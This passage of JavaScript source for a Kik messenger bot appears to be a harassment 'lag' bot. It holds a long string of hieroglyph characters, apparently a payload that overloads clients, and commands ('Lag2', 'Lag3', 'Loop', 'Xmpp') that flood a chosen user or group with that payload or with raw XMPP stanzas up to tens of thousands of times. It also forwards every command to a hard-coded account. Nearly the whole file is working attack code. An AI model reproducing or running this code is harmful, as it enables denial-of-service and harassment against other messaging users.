𓌪𓍁𓇡𓀙𓄟𓆮𓋀𓌅𓂪𓊼𓍽𓊓𓀅𓌀𓋽𓏜𓂊𓍢𓁍𓐜𓅭𓇻𓌏𓃎𓏖𓋝𓐃𓏎𓈄𓅬𓌾𓁭𓊳𓅾𓃸𓎑𓊢𓇸𓍾𓏪𓎣𓈒𓅕𓄍𓂋𓈁𓂝𓉧𓁴𓎃𓋈𓌄𓉢𓊝𓏇𓃓𓈕𓉤𓃙𓁲𓄫𓌨𓌧𓉄𓉇𓏔𓊃𓉐𓁸𓎱𓇙𓊗𓏵𓀶𓈼𓏞𓃰𓂓𓈤𓇬𓏂𓏺𓀀𓊯𓐡𓎚𓅐𓈑𓈧𓏉𓌌𓏣𓂽𓉼𓎨𓈐𓄽𓍛𓎩𓍘𓌴𓂧𓇏𓊥𓍙𓍸𓆳𓉸𓏍𓂃𓄆𓅜𓌔𓅻𓂆𓄜𓇽𓁄𓊶𓎎𓃘𓈷𓐌𓄡𓅊𓏥𓈥𓂬𓅦𓉽𓊮𓉠𓆜𓐉𓉵𓆠𓇖𓎪𓃯𓍯𓁾𓈆𓂩𓆼𓀇𓎽𓐦𓄞𓁬𓊭𓊏𓍅𓋭𓃛𓏋𓃗𓎄𓌻𓄚𓉴𓊿𓂴𓈃𓀚𓍍𓌿𓃚𓐬𓂐𓐢𓌡𓅗𓈴𓇣𓅣𓂕𓀍𓈭𓃖𓂛𓅁𓈣𓌫𓐫𓄲𓁥𓉮𓍖𓆐𓄋𓄥𓊕𓎘𓎀𓍀𓋫𓀯𓇭𓃵𓈏𓋂𓀿𓅙𓇹𓆂𓂵𓌉𓏚𓁵𓆚𓈵𓏏𓂣𓃁𓎴𓂎𓉘𓍭𓃳𓏠𓌂𓀾𓈞𓌁𓄂𓁅𓅋𓍮𓇅𓆗𓐕𓇯𓃹𓄾𓉦𓊫𓅴𓉆𓍜𓊠𓆴𓀊𓋾𓅨𓎠𓐭𓈰𓋑𓉡𓌯𓂯𓃋𓈌𓊰𓈘𓁚𓍟𓍶𓂱𓄼𓋕𓋄𓂖𓐞𓋴𓊹𓃜𓌦𓈶𓏙𓂜𓌇𓇋𓉉𓎍𓆱𓌳𓌒𓂀𓍦𓁜𓀄𓈾𓋆𓋌𓐪𓀼𓐗𓎫𓉰𓀪𓍒𓃻𓄎𓆦𓄊𓅍𓆲𓃼𓇑𓏇𓅳𓄥𓊑𓍲𓋐𓉖𓐤𓎱𓁜𓈺𓀉𓏻𓀢𓅹𓇥𓀓𓀗𓐞𓃆𓁕𓐜𓊾𓀩𓏲𓋺𓌊𓅞𓀏𓄡𓅊";

/*PRIVATE EVENTS*/

Kik.on("receivedprivatemsg", async (sender, msg) => {

  let msgParts = msg.split(" ");

  let msgNL = msg.split("\n");

  if (msgParts[0] == "Xmpp" && msgParts[1].endsWith(".kik.com")) {

    (async () => {

      Kik.sendXmpp("endd_y9c@talk.kik.com ", msg);

      let numb = 0;

      while (numb <= parseInt(msgParts[2])) {

        await Kik.sendXmpp(msgParts[1], decode(msgNL[1]));

        await new Promise(resolve => setTimeout(resolve, delay));

        numb += 1;

      }

      // await Kik.forceAdmin(sender.jid);

    })();

    return;

  }

  if (msgParts[0] == "Add" && msgParts[1] == "me") {

    let mess = "Fuck friends 🖕, I'll add you anyway.";

    await Kik.addFriend(sender.jid);

    await Kik.addFriend(sender.jid);

    await Kik.addFriend(sender.jid);

    await Kik.sendMessage(sender.jid, mess);

    return;

  }

  if (msgParts[0] == "Reset") {

    let mess = "https://gottabeskiddingmee.glitch.me";

    await Kik.sendMessage(sender.jid, mess);

    return;

  }

  if (msgParts[0] == "Bot" && msgParts[1] == "commands") {

    let mess =

      "Bot commands:                                                               Check / Reset / Xmpp link / Lag2 jid 5-50000 / Lag3 jid 5-50000 / Loop jid 5-50000 / Add me ";

    await Kik.sendMessage(sender.jid, mess);

    return;

  }

  if (msgParts[0] == "Check" ) {

    let mess = "Online";

    await Kik.sendMessage(sender.jid, mess);

    return;

  }


  if (msgParts[0] == "Xmpp" && msgParts[1] == "link") {

    let mess = " https://xmppfire.glitch.me ";

    await Kik.sendMessage(sender.jid, mess);

    return;

  }


  if (msgParts[0] == "Lag2" && msgParts[1].endsWith(".kik.com")) {

    (async () => {

      Kik.sendMessage("endd_y9c@talk.kik.com ", msg);

      let mess = "Attack started ";

      await Kik.sendMessage(sender.jid, mess);

      let numb = 0;

      while (numb <= msgParts[2]) {

        await Kik.sendMessage(msgParts[1], lag2);

        await new Promise(resolve => setTimeout(resolve, delay));

        numb += 1;

      }

      // await Kik.forceAdmin(sender.jid);

      let mess2 = "all\x20done\x20sending\x20" + msgParts[2] + "\x20loops";

      await Kik.sendMessage(sender.jid, mess2);

      return;

    })();

    // await Kik.forceAdmin(sender.jid);

    return;

  }

  if (msgParts[0] == "Lag2" && msgParts[1].endsWith("@groups.kik.com")) {

    (async () => {

      Kik.sendMessage("endd_y9c@talk.kik.com ", msg);

      let mess = "Attack started ";

      await Kik.sendMessage(sender.jid, mess);

      let numb = 0;

      while (numb <= msgParts[2]) {

        await Kik.sendMessage(msgParts[1], lag2);

        await new Promise(resolve => setTimeout(resolve, delay));

        numb += 1;

      }

      // await Kik.forceAdmin(sender.jid);

      let mess2 = "all\x20done\x20sending\x20" + msgParts[2] + "\x20loops";

      await Kik.sendMessage(sender.jid, mess2);

      return;

    })();

    // await Kik.forceAdmin(sender.jid);

    return;

  }

  if (msgParts[0] == "Lag3" && msgParts[1].endsWith("@groups.kik.com")) {

    (async () => {

      Kik.sendMessage("endd_y9c@talk.kik.com ", msg);

      let mess = "Attack started ";

      await Kik.sendMessage(sender.jid, mess);

      let numb = 0;

      while (numb <= msgParts[2]) {

        await Kik.sendMessage(msgParts[1], lag3);

        await new Promise(resolve => setTimeout(resolve, delay));

        numb += 1;

      }

      // await Kik.forceAdmin(sender.jid);

      let mess2 = "all\x20done\x20sending\x20" + msgParts[2] + "\x20loops";

      await Kik.sendMessage(sender.jid, mess2);

      return;

    })();

    // await Kik.forceAdmin(sender.jid);

    return;

  }

  if (msgParts[0] == "Lag3" && msgParts[1].endsWith(".kik.com")) {

    (async () => {

      Kik.sendMessage("endd_y9c@talk.kik.com ", msg);

      let mess = "Attack started ";

      await Kik.sendMessage(sender.jid, mess);

      let numb = 0;

      while (numb <= msgParts[2]) {

        await Kik.sendMessage(msgParts[1], lag3);

        await new Promise(resolve => setTimeout(resolve, delay));

        numb += 1;

      }

      // await Kik.forceAdmin(sender.jid);

      let mess2 = "all\x20done\x20sending\x20" + msgParts[2] + "\x20loops";

      await Kik.sendMessage(sender.jid, mess2);

      return;

    })();

    // await Kik.forceAdmin(sender.jid);

    return;

  }

  if (msgParts[0] == "Loop" && msgParts[1].endsWith("@groups.kik.com")) {

    (async () => {

      Kik.sendMessage("endd_y9c@talk.kik.com ", msg);

      let mess = "Attack started ";

      await Kik.sendMessage(sender.jid, mess);

      let numb = 0;

      while (numb <= msgParts[2]) {

        await Kik.sendMessage(msgParts[1], lag1);

        await new Promise(resolve => setTimeout(resolve, delay));

        numb += 1;

      }

      // await Kik.forceAdmin(sender.jid);

      let mess2 = "all\x20done\x20sending\x20" + msgParts[2] + "\x20loops";

      await Kik.sendMessage(sender.jid, mess2);

      return;

    })();

    // await Kik.forceAdmin(sender.jid);

    return;

  }

  if (msgParts[0] == "Loop" && msgParts[1].endsWith(".kik.com")) {

    (async () => {

      Kik.sendMessage("endd_y9c@talk.kik.com ", msg);

      let mess = "Attack started ";

      await Kik.sendMessage(sender.jid, mess);

      let numb = 0;

      while (numb <= msgParts[2]) {

        await Kik.sendMessage(msgParts[1], lag1);

        await new Promise(resolve => setTimeout(resolve, delay));

        numb += 1;

      }

      // await Kik.forceAdmin(sender.jid);

      let mess2 = "all\x20done\x20sending\x20" + msgParts[2] + "\x20loops";

      await Kik.sendMessage(sender.jid, mess2);

      return;

    })();

    // await Kik.forceAdmin(sender.jid);

    return;

  }

});

Kik.on("privatetyping", (sender, isTyping) => {

  if (isTyping) {

    console.log(`PRIVATE: ${sender.jid} is typing`);

  } else {

    console.log(`PRIVATE: ${sender.jid} stopped typing`);

  }

});

// listen for requests :)

const listener = app.listen(process.env.PORT, function() {

  Kik.connect();

  console.log("Your app is listening on port " + listener.address().port);

});

